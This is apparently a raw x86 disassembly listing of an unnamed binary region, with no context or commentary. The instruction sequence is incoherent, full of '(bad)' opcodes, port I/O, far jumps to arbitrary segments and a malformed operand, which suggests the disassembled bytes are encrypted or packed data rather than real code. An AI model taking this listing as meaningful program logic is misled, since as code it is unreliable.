  41517e:	mov    bl,0xac
  415180:	jp     0x415136
  415182:	clc    
  415183:	ud0    edi,DWORD PTR [esp+ebp*8+0x6f]
  415188:	pop    es
  415189:	jmp    0x41514e
  41518b:	repnz imul esi,DWORD PTR [eax],0xffffffd3
  41518f:	xor    esi,DWORD PTR [eax-0x1b11b00a]
  415195:	fild   DWORD PTR [edx]
  415197:	cmp    eax,0xf6483e4b
  41519c:	lea    edx,[esi]
  41519e:	push   esp
  41519f:	xor    BYTE PTR [esi],0x93
  4151a2:	inc    edi
  4151a3:	das    
  4151a4:	repnz addr16 inc esp
  4151a7:	aam    0xdd
  4151a9:	xchg   esi,eax
  4151aa:	push   es
  4151ab:	test   BYTE PTR [ebx+0x122129c3],ah
  4151b1:	in     eax,0xfe
  4151b3:	gs clc 
  4151b5:	ins    BYTE PTR es:[edi],dx
  4151b6:	mov    ebx,0x219a4483
  4151bb:	out    0x99,al
  4151bd:	xchg   esi,eax
  4151be:	jne    0x4151b7
  4151c0:	fnstcw WORD PTR [ecx-0xa5fee6]
  4151c6:	aad    0x71
  4151c8:	xor    eax,0xd142e74c
  4151cd:	lds    ebp,FWORD PTR [edx+0x4605b863]
  4151d3:	fistp  WORD PTR [esi+0x4a652288]
  4151d9:	cmp    esp,edx
  4151db:	pusha  
  4151dc:	sub    cx,bx
  4151df:	rcl    BYTE PTR [eax+ebp*2],0xfc
  4151e3:	and    bl,bh
  4151e5:	inc    edi
  4151e6:	mov    al,0x7c
  4151e8:	cmc    
  4151e9:	sti    
  4151ea:	fnstenv [ebx+0x6b]
  4151ed:	ja     0x415226
  4151ef:	les    edx,FWORD PTR [eax]
  4151f1:	adc    edi,ecx
  4151f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151f4:	dec    ecx
  4151f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151f6:	dec    ebx
  4151f7:	jg     0x4151e6
  4151f9:	daa    
  4151fa:	or     BYTE PTR [esi+0x76],cl
  4151fd:	pop    ecx
  4151fe:	je     0x4151ec
  415200:	clc    
  415201:	inc    ebx
  415202:	out    dx,eax
  415203:	retf   
  415204:	rol    BYTE PTR [eax-0x18696e71],0x27
  41520b:	aaa    
  41520c:	and    al,BYTE PTR [esi+0x5]
  41520f:	je     0x41523c
  415211:	retf   0x5112
  415214:	xchg   BYTE PTR [ebp-0xbccc4d9],ah
  41521a:	sbb    eax,0x6fdebc8b
  41521f:	mov    cl,0x2b
  415221:	sahf   
  415222:	mov    ds:0xf7315d,al
  415227:	test   DWORD PTR [eax+0x50],0xc449a159
  41522e:	cmp    BYTE PTR [ebp+0x365482cb],al
  415234:	cwde   
  415235:	xchg   edi,eax
  415236:	cmc    
  415237:	cmp    ch,BYTE PTR [edx+0x3149c45a]
  41523d:	pushw  cs
  41523f:	jmp    0xe2ee:0xaaa90238
  415246:	dec    ebp
  415247:	push   ds
  415248:	popa   
  415249:	xchg   ebx,eax
  41524a:	ret    0xfa67
  41524d:	jmp    0x4151e8
  41524f:	fstp   QWORD PTR fs:[eax]
  415252:	int    0x23
  415254:	mov    dl,0x90
  415256:	out    dx,eax
  415257:	mov    al,ds:0xd17ee764
  41525c:	es pop eax
  41525e:	mov    BYTE PTR [ebx+edx*1-0x2c864c54],dl
  415265:	addr16 inc ebx
  415267:	dec    ebx
  415268:	add    BYTE PTR [ebp+ebp*4+0x65d32f45],dh
  41526f:	shl    dl,1
  415271:	sub    bl,BYTE PTR [esi]
  415273:	mov    bh,BYTE PTR [eax-0x5fa96baf]
  415279:	mul    BYTE PTR [edi+0x2e7e4fda]
  41527f:	adc    BYTE PTR [ebp+ebx*8+0x16],0x94
  415284:	cwde   
  415285:	mov    al,ds:0xa370ae3a
  41528a:	sahf   
  41528b:	cld    
  41528c:	cld    
  41528d:	adc    eax,esp
  41528f:	push   edi
  415290:	push   ecx
  415291:	inc    ecx
  415292:	retf   0x4d0b
  415295:	arpl   WORD PTR ds:0x635cd676,sp
  41529b:	inc    edx
  41529c:	sbb    BYTE PTR [ecx-0x2845f22e],bl
  4152a2:	imul   ecx,DWORD PTR ds:0xb7cbb92f,0xffffffae
  4152a9:	inc    edi
  4152aa:	jg     0x415295
  4152ac:	(bad)  
  4152ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152ae:	push   ecx
  4152af:	push   ebp
  4152b0:	loopne 0x4152bf
  4152b2:	push   edi
  4152b3:	and    al,0xf6
  4152b5:	mov    esi,0x2d10f8e2
  4152ba:	mov    eax,ds:0x67428027
  4152bf:	mov    ebp,0xd9f98199
  4152c4:	xchg   ecx,eax
  4152c5:	xchg   DWORD PTR [eax+0x28e4168],edx
  4152cb:	fcomip st,st(6)
  4152cd:	sbb    DWORD PTR [ebp-0x286bd43a],0x36
  4152d4:	adc    dh,BYTE PTR [ebx+0x7f]
  4152d7:	mov    esi,0x18d02712
  4152dc:	imul   DWORD PTR [ecx-0x4c]
  4152df:	sub    DWORD PTR [edi],0x6af5f1b1
  4152e5:	pop    ebx
  4152e6:	in     al,0x6e
  4152e8:	clc    
  4152e9:	movsx  ebp,dh
  4152ec:	push   esi
  4152ed:	or     DWORD PTR [edx],0x6d813a78
  4152f3:	and    BYTE PTR [ebx],cl
  4152f5:	pusha  
  4152f6:	mov    edi,0xd1f8547e
  4152fb:	mov    dh,0xb3
  4152fd:	int3   
  4152fe:	jp     0x415324
  415300:	xchg   ebp,eax
  415301:	cdq    
  415302:	dec    edi
  415303:	add    BYTE PTR [eax-0x2392fb36],cl
  415309:	and    eax,0x4120731f
  41530e:	mov    esi,0x6a50824c
  415313:	push   ss
  415314:	or     al,al
  415316:	jle    0x4152e7
  415318:	add    DWORD PTR [ebp+0x11],esi
  41531b:	or     DWORD PTR [esi+edx*4+0x3a],eax
  41531f:	aam    0x69
  415321:	pop    es
  415322:	clc    
  415323:	ficomp DWORD PTR [esi+edi*1+0x2c]
  415327:	mov    al,0x6
  415329:	sub    eax,0x91b272c
  41532e:	add    BYTE PTR [edx],bh
  415330:	imul   esp,DWORD PTR [ecx-0x295230ef],0x54
  415337:	pop    ss
  415338:	or     DWORD PTR [ecx+0x14],edi
  41533b:	popa   
  41533c:	sub    eax,0xa5d748c2
  415341:	addr16 mov edi,0xc51505c8
  415347:	push   edi
  415348:	mov    al,0x5a
  41534a:	lds    edx,FWORD PTR [edx-0x44]
  41534d:	into   
  41534e:	hlt    
  41534f:	add    al,0xc4
  415351:	dec    esi
  415352:	push   esi
  415353:	repz fisttp QWORD PTR [edi-0x2f9d5069]
  41535a:	push   esi
  41535b:	xchg   ecx,eax
  41535c:	call   FWORD PTR [edx+0x1a]
  41535f:	loopne 0x4153b3
  415361:	mov    bl,0x53
  415363:	push   esi
  415364:	aas    
  415365:	dec    ebx
  415366:	or     al,0xde
  415368:	fld    QWORD PTR [ebp+0x68]
  41536b:	or     BYTE PTR [edi+0x7f28638e],bl
  415371:	push   0x54d90069
  415376:	loop   0x41530f
  415378:	clc    
  415379:	mov    ah,0x7b
  41537b:	pusha  
  41537c:	inc    ecx
  41537d:	test   DWORD PTR [ebp-0x4866de29],0x1cc49267
  415387:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415388:	sbb    eax,0x90fbdb41
  41538d:	sub    DWORD PTR [ebx+0x9],esp
  415390:	mov    al,0x8a
  415392:	add    ebx,ebp
  415394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415395:	push   ss
  415396:	push   ebx
  415397:	in     al,dx
  415398:	xchg   BYTE PTR [esi-0x7cb47100],bl
  41539e:	xchg   DWORD PTR [edx+0x54],esp
  4153a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153a2:	in     al,dx
  4153a3:	fnstenv [di]
  4153a6:	sub    al,0x2e
  4153a8:	jbe    0x4153e7
  4153aa:	jbe    0x415347
  4153ac:	mov    edi,0x23e5b93b
  4153b1:	not    DWORD PTR [ebx-0x1b]
  4153b4:	pop    ebx
  4153b5:	int    0xb5
  4153b7:	(bad)  
  4153b8:	ror    BYTE PTR ds:0x1feeca70,cl
  4153be:	jb     0x4153bf
  4153c0:	pusha  
  4153c1:	add    al,0x73
  4153c3:	enter  0x47ac,0x7a
  4153c7:	push   ecx
  4153c8:	mov    edx,0x5fd9f00
  4153cd:	or     al,0x5b
  4153cf:	add    ebp,0x3eeaff67
  4153d5:	add    BYTE PTR [ebp-0x11],0x39
  4153d9:	lods   al,BYTE PTR ds:[esi]
  4153da:	test   BYTE PTR [edi+ebx*4-0x7b5919f],cl
  4153e1:	mov    ebx,0x69351d0c
  4153e6:	inc    eax
  4153e7:	in     al,dx
  4153e8:	out    dx,eax
  4153e9:	mov    dh,dl
  4153eb:	sub    DWORD PTR [eax+eax*8+0x31e528e9],ebx
  4153f2:	(bad)  
  4153f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153f4:	int3   
  4153f5:	sub    cl,BYTE PTR [eax+0x1b]
  4153f8:	mov    ds:0x5df870d3,al
  4153fd:	leave  
  4153fe:	or     al,0xd5
  415400:	pop    edx
  415401:	sub    eax,DWORD PTR [ecx]
  415403:	xchg   ecx,eax
  415404:	mov    esi,0xd2db91e1
  415409:	mov    ebp,0xcc0a91fb
  41540e:	mov    edi,0x309eed44
  415413:	mov    ss,esp
  415415:	repz addr16 mov eax,ds:0x93d9
  41541a:	stos   BYTE PTR es:[edi],al
  41541b:	dec    edi
  41541c:	inc    esp
  41541d:	add    eax,0x1c27f847
  415422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415423:	mov    al,ds:0x7077bfe6
  415428:	inc    ebp
  415429:	lds    ebx,FWORD PTR [edx]
  41542b:	cs test eax,0x3260dcb6
  415431:	sub    BYTE PTR [ecx],0x39
  415434:	(bad)  
  415435:	out    0x5e,al
  415437:	sub    eax,0x44b6c622
  41543c:	push   cs
  41543d:	ror    BYTE PTR [esi-0x28],cl
  415440:	arpl   WORD PTR [edx-0x15],sp
  415443:	int3   
  415444:	xor    DWORD PTR [edi],0xffffffa7
  415447:	jl     0x4154a0
  415449:	jg     0x4153ed
  41544b:	(bad)  
  41544c:	int    0xea
  41544e:	sar    esi,0xf9
  415451:	rcl    DWORD PTR [esp+eax*8+0xfe34e1],cl
  415458:	cmp    al,0x17
  41545a:	mov    edx,0x9c749ee1
  41545f:	add    eax,0xe7882883
  415464:	add    al,0x17
  415466:	lock retf 0xd435
  41546a:	adc    edi,eax
  41546c:	mul    DWORD PTR [edx]
  41546e:	cmp    DWORD PTR [ecx+ebp*1],esp
  415471:	int3   
  415472:	out    dx,eax
  415473:	cmc    
  415474:	ins    BYTE PTR es:[edi],dx
  415475:	cmp    eax,0x34c09a16
  41547a:	pushf  
  41547b:	push   ebx
  41547c:	out    0xda,al
  41547e:	jecxz  0x415478
  415480:	out    0xb,eax
  415482:	mov    ds:0x323754a0,al
  415487:	jae    0x415473
  415489:	push   eax
  41548a:	enter  0x9144,0x49
  41548e:	mov    al,cs:0x98afdc5f
  415494:	sbb    esi,esi
  415496:	dec    eax
  415497:	pop    ss
  415498:	dec    ax
  41549a:	enter  0x155b,0x61
  41549e:	fidivr WORD PTR ss:[ebp+0x1c]
  4154a2:	fwait
  4154a3:	test   eax,0xcc233c76
  4154a8:	add    eax,0xb04e133b
  4154ad:	push   cs
  4154ae:	daa    
  4154af:	mov    dh,BYTE PTR [eax+0x16]
  4154b2:	cmp    al,0x13
  4154b4:	(bad)  
  4154b5:	ror    DWORD PTR [esi+0x4c2c8b8e],cl
  4154bb:	mov    al,0xd7
  4154bd:	mov    ebp,0x6ba1feb9
  4154c2:	jg     0x4154a3
  4154c4:	jmp    0x415502
  4154c6:	inc    edx
  4154c7:	fcom   QWORD PTR [ecx+ebp*2]
  4154cb:	and    esp,DWORD PTR [eax+0x60]
  4154ce:	(bad)  
  4154cf:	rcr    DWORD PTR [esi],0xa8
  4154d2:	aaa    
  4154d3:	shl    BYTE PTR ds:0x1ab77ddf,1
  4154d9:	(bad)  
  4154da:	pop    eax
  4154db:	cdq    
  4154dc:	jmp    0xb8fccb54
  4154e1:	jo     0x41546c
  4154e3:	xor    al,BYTE PTR [ecx]
  4154e5:	push   edx
  4154e6:	stos   DWORD PTR es:[edi],eax
  4154e7:	fwait
  4154e8:	into   
  4154e9:	gs pop ebx
  4154eb:	cmc    
  4154ec:	push   ebp
  4154ed:	icebp  
  4154ee:	retf   
  4154ef:	or     ecx,ebx
  4154f1:	mul    DWORD PTR [edi+0x3b]
  4154f4:	hlt    
  4154f5:	scas   eax,DWORD PTR es:[edi]
  4154f6:	jo     0x415539
  4154f8:	cs icebp 
  4154fa:	mov    ecx,0xfded1753
  4154ff:	shl    DWORD PTR [esp+ecx*1],0x7a
  415503:	or     al,0xc3
  415505:	loope  0x415499
  415507:	mov    esi,0xb57b77da
  41550c:	or     DWORD PTR [edi-0x7f],esp
  41550f:	shr    BYTE PTR [ebx*8+0x4de62700],0xd9
  415517:	add    DWORD PTR [ebp+0x3ac884d2],ebx
  41551d:	stc    
  41551e:	daa    
  41551f:	jg     0x415553
  415521:	call   DWORD PTR [edi-0x4c]
  415524:	lods   al,BYTE PTR ds:[esi]
  415525:	aas    
  415526:	loop   0x415592
  415528:	and    DWORD PTR [ebx-0x31],esi
  41552b:	push   edi
  41552c:	aam    0x98
  41552e:	lds    edx,FWORD PTR [esi]
  415530:	jl     0x41556f
  415532:	shl    BYTE PTR [edi],1
  415534:	ins    DWORD PTR es:[edi],dx
  415535:	xchg   BYTE PTR [eax-0x47],ah
  415538:	gs or  eax,0xc7160bdd
  41553e:	rcr    DWORD PTR [ecx-0x3f],0x20
  415542:	mov    ds,ebx
  415544:	das    
  415545:	mov    WORD PTR ds:[eax+esi*2],ds
  415549:	lods   al,BYTE PTR ds:[esi]
  41554a:	and    al,0x70
  41554c:	add    BYTE PTR es:[ebx],0xb8
  415550:	xchg   ebp,eax
  415551:	in     eax,0x46
  415553:	popf   
  415554:	dec    ebx
  415555:	xchg   edi,eax
  415556:	retf   
  415557:	int3   
  415558:	neg    DWORD PTR [edx]
  41555a:	in     al,dx
  41555b:	push   esi
  41555c:	mov    ah,0x4
  41555e:	sub    esp,DWORD PTR [eax-0x24]
  415561:	sbb    eax,0x89bdf1e4
  415566:	mov    bl,bl
  415568:	add    cl,bh
  41556a:	rcr    edi,1
  41556c:	mov    ah,0xae
  41556e:	sbb    al,0x67
  415570:	sti    
  415571:	in     eax,dx
  415572:	std    
  415573:	in     eax,dx
  415574:	push   ds
  415575:	xor    al,0xd0
  415577:	pop    eax
  415578:	fsub   QWORD PTR [edx-0x58]
  41557b:	call   0xcd21bd65
  415580:	inc    ebp
  415581:	sbb    DWORD PTR [ecx],0xd5708edd
  415587:	scas   al,BYTE PTR es:[edi]
  415588:	jne    0x41555b
  41558a:	add    al,0x9c
  41558c:	ss mov eax,ds
  41558f:	cmc    
  415590:	retf   
  415591:	imul   edi,edx,0xffffffe2
  415594:	sbb    cl,cl
  415596:	imul   edi,DWORD PTR [edi-0x6f],0xefd0c43
  41559d:	push   ebp
  41559e:	in     eax,dx
  41559f:	mov    esp,0x5996b569
  4155a4:	cs out dx,eax
  4155a6:	mov    ah,0x9d
  4155a8:	pop    eax
  4155a9:	ror    DWORD PTR [ebp-0x2e],0x6f
  4155ad:	ret    
  4155ae:	or     ah,BYTE PTR [edx-0x2a979fae]
  4155b4:	push   edx
  4155b5:	cmp    eax,0x6557552b
  4155ba:	sbb    dl,BYTE PTR [edi]
  4155bc:	int    0xd5
  4155be:	mov    dh,0xa2
  4155c0:	call   0xd0ea:0x1d527779
  4155c7:	ret    
  4155c8:	mov    al,ds:0x88ede705
  4155cd:	mov    ebx,0x8bcea2e6
  4155d2:	mov    eax,0xbd24dc41
  4155d7:	dec    ebp
  4155d8:	adc    al,0xfb
  4155da:	ja     0x41563f
  4155dc:	mov    dl,0x3f
  4155de:	test   DWORD PTR [esi+esi*4],edi
  4155e1:	lods   al,BYTE PTR ds:[esi]
  4155e2:	outs   dx,BYTE PTR ds:[esi]
  4155e3:	sub    edx,DWORD PTR [ebp-0x6a]
  4155e6:	mov    ebp,0x1add12ae
  4155eb:	cmp    eax,0xcfe15809
  4155f0:	ret    
  4155f1:	aad    0x7
  4155f3:	ja     0x415606
  4155f5:	loope  0x4155f1
  4155f7:	mov    ebp,0xb170644d
  4155fc:	dec    ebx
  4155fd:	mov    ch,0x4a
  4155ff:	js     0x415662
  415601:	mov    dh,0x48
  415603:	xchg   ebx,eax
  415604:	cld    
  415605:	mov    dh,BYTE PTR [esi-0x19f43341]
  41560b:	ja     0x415657
  41560d:	adc    DWORD PTR ds:0x2dd10311,esp
  415613:	sub    eax,0xc2786e0a
  415618:	pop    eax
  415619:	and    edi,DWORD PTR [ebx-0x299087b]
  41561f:	bound  edi,QWORD PTR [ebp+0x7a]
  415622:	xor    dl,BYTE PTR [ebx+edi*4+0x35544386]
  415629:	inc    eax
  41562a:	xchg   ebp,eax
  41562b:	or     eax,0x11e131f7
  415630:	fbstp  TBYTE PTR [ebp-0x78dec592]
  415636:	es mov bh,bh
  415639:	adc    DWORD PTR [esi+0x26],esi
  41563c:	icebp  
  41563d:	and    eax,eax
  41563f:	test   al,0xba
  415641:	repnz and ah,BYTE PTR es:[ebx-0x33]
  415646:	das    
  415647:	rol    DWORD PTR [esp+esi*4+0x188e20ad],0xd1
  41564f:	cmp    eax,DWORD PTR [ecx-0x8]
  415652:	sbb    eax,ebx
  415654:	push   0xffffffb5
  415656:	fstp   DWORD PTR [esi+0x52]
  415659:	and    ebp,DWORD PTR [esi+ebp*2+0x4f93240d]
  415660:	mov    edx,0x7e93e75b
  415665:	lds    esp,FWORD PTR [esi+0x202dc993]
  41566b:	and    ch,BYTE PTR [ecx+ecx*8-0xf633634]
  415672:	xchg   ecx,eax
  415673:	adc    ebx,ebx
  415675:	sbb    al,0xa4
  415677:	not    DWORD PTR cs:[eax-0x58fbb47b]
  41567e:	cmp    ecx,DWORD PTR [esi]
  415680:	dec    ecx
  415681:	sub    esp,ebx
  415683:	inc    edx
  415684:	sbb    ah,BYTE PTR [ecx-0x5b]
  415687:	addr16 sbb eax,0x4e1cf888
  41568d:	and    eax,0xe88039ed
  415692:	(bad)  
  415693:	mov    ebp,0xad1d9c6
  415698:	and    esp,DWORD PTR [edi+0x21]
  41569b:	push   cs
  41569c:	cld    
  41569d:	dec    edi
  41569e:	rcl    DWORD PTR [eax],1
  4156a0:	cdq    
  4156a1:	sub    eax,0x20bc472f
  4156a6:	xor    esp,edi
  4156a8:	call   0x700e:0xefb7e933
  4156af:	mov    edi,0xdf8a5055
  4156b4:	cmp    bh,BYTE PTR [eax]
  4156b6:	inc    esi
  4156b7:	add    bl,BYTE PTR [edx]
  4156b9:	cwde   
  4156ba:	xor    DWORD PTR [edx],ebx
  4156bc:	pop    edx
  4156bd:	fcomp  QWORD PTR [edi]
  4156bf:	mov    BYTE PTR [edi],al
  4156c1:	mov    ch,BYTE PTR [eax-0x59]
  4156c4:	stc    
  4156c5:	lea    ebp,[edi]
  4156c7:	push   ebx
  4156c8:	pop    es
  4156c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156cc:	sti    
  4156cd:	pop    esi
  4156ce:	jmp    0xcf60:0x30558db7
  4156d5:	inc    ebx
  4156d6:	jbe    0x41570d
  4156d8:	cld    
  4156d9:	adc    al,0xfa
  4156db:	ret    
  4156dc:	loop   0x4156e7
  4156de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156df:	pop    ss
  4156e0:	sub    ah,al
  4156e2:	jecxz  0x4156af
  4156e4:	ror    BYTE PTR [ebp+ecx*4-0x1b0709df],1
  4156eb:	aam    0x66
  4156ed:	adc    eax,0xa9dc16d
  4156f2:	outs   dx,BYTE PTR ds:[esi]
  4156f3:	sub    al,0x35
  4156f5:	call   0x52dc:0x2ca94da2
  4156fc:	xchg   BYTE PTR [eax+0x70ea11e9],dl
  415702:	or     eax,0xe06e3548
  415707:	add    eax,0x54036c00
  41570c:	shl    DWORD PTR [edx-0x34],cl
  41570f:	mov    eax,ds:0x8ba4a11d
  415714:	jle    0x4156ba
  415716:	fst    QWORD PTR [ebx+0x42924b53]
  41571c:	sub    eax,0x5f61840e
  415721:	(bad)  
  415723:	push   ebp
  415724:	mov    ds:0xe4f66b43,al
  415729:	rol    BYTE PTR [ecx+0x7198f71a],0xfe
  415730:	mov    WORD PTR [esi+ebp*2+0x55],cs
  415734:	inc    edx
  415735:	push   0x1d49e13b
  41573a:	add    al,0x24
  41573c:	jae    0x415703
  41573e:	enter  0xd6d3,0x1c
  415742:	and    ah,BYTE PTR [ecx]
  415744:	call   DWORD PTR [edx+0x1db75b90]
  41574a:	xchg   ebx,eax
  41574b:	fnstenv [edi+0x39]
  41574e:	add    BYTE PTR [edi+esi*4-0x75952405],ah
  415755:	call   0x80d4bb12
  41575a:	xchg   edx,eax
  41575b:	lods   eax,DWORD PTR ds:[esi]
  41575c:	sub    BYTE PTR [esi+0x714f709f],cl
  415762:	mov    ebp,0x5b88a51d
  415767:	jno    0x4157cd
  415769:	cmp    bl,BYTE PTR [ebx+0x47]
  41576c:	pop    ebp
  41576d:	popf   
  41576e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41576f:	push   ss
  415770:	cmp    ecx,DWORD PTR [edi+0x2e]
  415773:	shl    DWORD PTR [eax-0x4ac3ebf3],cl
  415779:	scas   eax,DWORD PTR es:[edi]
  41577a:	cli    
  41577b:	add    al,0x58
  41577d:	pop    ss
  41577e:	jb     0x415778
  415780:	jmp    DWORD PTR [edi+edx*4+0x5d92d0b2]
  415787:	gs xor al,0xc1
  41578a:	sahf   
  41578b:	sahf   
  41578c:	scas   eax,DWORD PTR es:[edi]
  41578d:	push   DWORD PTR [ebp+0x3807bfc1]
  415793:	loop   0x415783
  415795:	pop    ss
  415796:	fld    st(5)
  415798:	test   bh,bl
  41579a:	imul   BYTE PTR [ecx]
  41579c:	jnp    0x4157c2
  41579e:	mov    al,BYTE PTR [edx+0x760836ce]
  4157a4:	cvtps2pi mm1,xmm0
  4157a7:	dec    edi
  4157a8:	xor    BYTE PTR [ecx-0x2f0f8825],ah
  4157ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157af:	sub    dh,dl
  4157b1:	out    0xce,al
  4157b3:	fisubr DWORD PTR [ebx-0x21b85c38]
  4157b9:	dec    ecx
  4157ba:	ins    BYTE PTR es:[edi],dx
  4157bb:	dec    edx
  4157bc:	(bad)  
  4157be:	sbb    edi,DWORD PTR [ebx+0x2b8191e6]
  4157c4:	icebp  
  4157c5:	add    eax,0x97d024d1
  4157ca:	aad    0x32
  4157cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157cd:	fist   WORD PTR [ecx+0x6b]
  4157d0:	mov    ecx,0xc46e7170
  4157d5:	mov    ch,0xee
  4157d7:	and    al,0x5d
  4157d9:	jae    0x4157f9
  4157db:	cmp    al,0xed
  4157dd:	add    eax,0xee5c84de
  4157e2:	js     0x4157e8
  4157e4:	pusha  
  4157e5:	inc    ebp
  4157e6:	dec    esi
  4157e7:	xor    BYTE PTR [esi-0x1e],ah
  4157ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157eb:	sub    eax,0x9202f522
  4157f0:	or     al,0x88
  4157f2:	cmp    al,0x7a
  4157f4:	sbb    eax,0x9150d6d2
  4157f9:	mov    ds:0xd4217704,al
  4157fe:	out    0x38,al
  415800:	cmc    
  415801:	stc    
  415802:	mov    bh,0x8c
  415804:	push   ecx
  415805:	test   BYTE PTR [esi],dl
  415807:	xchg   ecx,eax
  415808:	daa    
  415809:	das    
  41580a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41580b:	mov    bl,0xd2
  41580d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41580e:	int3   
  41580f:	adc    BYTE PTR [ecx+eiz*1-0x2e],dh
  415813:	dec    ecx
  415814:	inc    ecx
  415815:	sub    BYTE PTR [edi+0x3153a4],cl
  41581b:	cmp    eax,0x76a2be8
  415820:	popa   
  415821:	push   ebp
  415822:	inc    edi
  415823:	push   ss
  415824:	and    dl,BYTE PTR [eax+eax*1-0x28]
  415828:	mov    ebx,0x293b1a1d
  41582d:	shr    DWORD PTR [ebp-0x34774890],0x9b
  415834:	mov    bh,0xfa
  415836:	mov    ebx,0x605d5085
  41583b:	lock add DWORD PTR [ebx-0x1496f287],eax
  415842:	pop    edx
  415843:	aam    0x86
  415845:	add    DWORD PTR [ebp+0x28],eax
  415848:	pop    ecx
  415849:	xchg   DWORD PTR [edi+0x7c],esp
  41584c:	mov    ch,0x41
  41584e:	hlt    
  41584f:	cs mov edi,0x989a2160
  415855:	pushf  
  415856:	inc    ebp
  415857:	add    BYTE PTR [eax-0x3eb849f6],al
  41585d:	in     eax,0x56
  41585f:	adc    DWORD PTR [eax],edi
  415861:	adc    bl,BYTE PTR [edx]
  415863:	cmp    ebp,ecx
  415865:	xor    BYTE PTR [eax],0x78
  415868:	mov    edi,DWORD PTR [ebx-0x64616f33]
  41586e:	imul   eax,DWORD PTR ds:0x8890d0c6,0xffffff95
  415875:	adc    dh,dl
  415877:	cmp    BYTE PTR [edi],dl
  415879:	dec    esi
  41587a:	jb     0x4158f9
  41587c:	jbe    0x415858
  41587e:	xor    ah,BYTE PTR [eax+0xb]
  415881:	jo     0x41584b
  415883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415884:	mov    eax,ds:0x29565f24
  415889:	lea    ecx,[ebx]
  41588b:	mov    al,0x42
  41588d:	addr16 jmp 0x4158cf
  415890:	cmp    eax,0xcb5a8ceb
  415895:	push   es
  415896:	hlt    
  415897:	cmp    dl,al
  415899:	sub    BYTE PTR [eax-0x7e],ah
  41589c:	leave  
  41589d:	xor    eax,0xc97728ae
  4158a2:	push   ebx
  4158a3:	push   es
  4158a4:	add    ecx,edi
  4158a6:	push   ebp
  4158a7:	jns    0x4158b5
  4158a9:	or     al,0x93
  4158ab:	jg     0x415896
  4158ad:	popa   
  4158ae:	or     BYTE PTR [ebx],bh
  4158b0:	add    esi,ebp
  4158b2:	imul   ebp,DWORD PTR [edx+0x4e46d59c],0xf68075f9
  4158bc:	dec    ebp
  4158bd:	(bad)  
  4158bf:	inc    ecx
  4158c0:	and    al,0x21
  4158c2:	jns    0x415896
  4158c4:	pop    esi
  4158c5:	imul   ecx,DWORD PTR [edx+0x5de22c0f],0xffffffaf
  4158cc:	loope  0x4158f4
  4158ce:	xor    ch,BYTE PTR [edx]
  4158d0:	(bad)  
  4158d1:	mov    eax,0x170cac2
  4158d6:	ret    0x941c
  4158d9:	xlat   BYTE PTR ds:[ebx]
  4158da:	out    dx,al
  4158db:	outs   dx,DWORD PTR ds:[esi]
  4158dc:	test   BYTE PTR [edi-0x60],ch
  4158df:	int    0x96
  4158e1:	push   esp
  4158e2:	(bad)  
  4158e3:	sar    edx,0xb3
  4158e6:	xchg   edi,eax
  4158e7:	repnz mov gs:0x178fde19,eax
  4158ee:	add    BYTE PTR fs:[ebx],ch
  4158f1:	ret    
  4158f2:	dec    ebx
  4158f3:	jmp    0xb44e:0x633087c0
  4158fa:	add    al,0x59
  4158fc:	add    al,0x7
  4158fe:	mov    cl,0x55
  415900:	adc    al,0x4f
  415902:	in     eax,dx
  415903:	shl    BYTE PTR [ecx*4-0x27802bf4],1
  41590a:	jne    0x4158bd
  41590c:	cli    
  41590d:	push   ds
  41590e:	dec    BYTE PTR [edi-0x749e5e6]
  415914:	sub    al,0x42
  415916:	inc    ebx
  415917:	cwde   
  415918:	fs inc ecx
  41591a:	fldcw  WORD PTR [ebx+0x27]
  41591d:	push   ecx
  41591e:	jge    0x4158c8
  415920:	sbb    al,0x44
  415922:	repz fadd DWORD PTR [edi]
  415925:	fcom   QWORD PTR [eax]
  415927:	lods   eax,DWORD PTR ds:[esi]
  415928:	aas    
  415929:	cmc    
  41592a:	out    dx,eax
  41592b:	jl     0x415909
  41592d:	cmp    al,0x19
  41592f:	outs   dx,BYTE PTR ds:[esi]
  415930:	push   cs
  415931:	ss stos BYTE PTR es:[edi],al
  415933:	es mov esi,0x173f500a
  415939:	push   esi
  41593a:	jecxz  0x4158d7
  41593c:	jp     0x415976
  41593e:	dec    eax
  41593f:	clc    
  415940:	popf   
  415941:	push   0x52
  415943:	bound  ebx,QWORD PTR [esi+0x1dddc9d1]
  415949:	in     al,0x94
  41594b:	sub    eax,0xf548d8e0
  415950:	shr    BYTE PTR [ecx],1
  415952:	dec    esi
  415953:	dec    ebp
  415954:	out    0xdd,eax
  415956:	xor    DWORD PTR [eax+eax*8],0xa5ae3684
  41595d:	in     al,0xa
  41595f:	jae    0x4159ab
  415961:	push   eax
  415962:	fwait
  415963:	dec    ebx
  415964:	retf   
  415965:	ficomp WORD PTR [edx+0x75]
  415968:	mov    bl,BYTE PTR [ecx]
  41596a:	mov    ah,al
  41596c:	mov    DWORD PTR [ecx+0x53405235],0x157e48e2
  415976:	mov    ?,ecx
  415978:	das    
  415979:	loop   0x415961
  41597b:	ret    0xd2f0
  41597e:	mov    ch,al
  415980:	cmp    esp,ecx
  415982:	aaa    
  415983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415984:	xchg   ebp,eax
  415985:	jnp    0x415970
  415987:	inc    eax
  415988:	rcl    DWORD PTR [edi+0x5a],0xc8
  41598c:	pusha  
  41598d:	test   BYTE PTR [ecx-0x5a],dh
  415990:	hlt    
